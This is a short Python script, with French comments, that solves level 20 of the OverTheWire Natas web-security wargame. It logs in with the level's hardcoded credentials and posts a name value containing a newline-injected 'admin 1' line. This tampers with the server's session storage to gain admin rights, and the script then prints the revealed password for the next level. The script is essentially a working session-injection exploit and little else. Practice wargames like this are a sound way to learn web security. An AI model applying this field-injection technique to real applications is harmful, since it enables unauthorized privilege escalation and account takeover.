#!/bin/python3
import requests

user = "natas20"
passwd = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH" 
url = "http://"+user+".natas.labs.overthewire.org"
hack = dict(name="test\nadmin 1")

session = requests.Session()
session.post(url, auth=(user, passwd), data=hack)

httpreq = session.get(url, auth=(user, passwd))

raw_response = httpreq.text
# Extraction des lignes
lines = raw_response.split('\n')
line_test = None

# Si Password trouvé on extrait la ligne.
for line in lines:
    if "Password" in line:
        line_test = line
        break

# Affichage de la ligne contenant "Password" s'il a été trouvé
if line_test:
    print("Ligne contenant 'Password:", line_test)
else:
    print("Pas de mot de passe trouvé")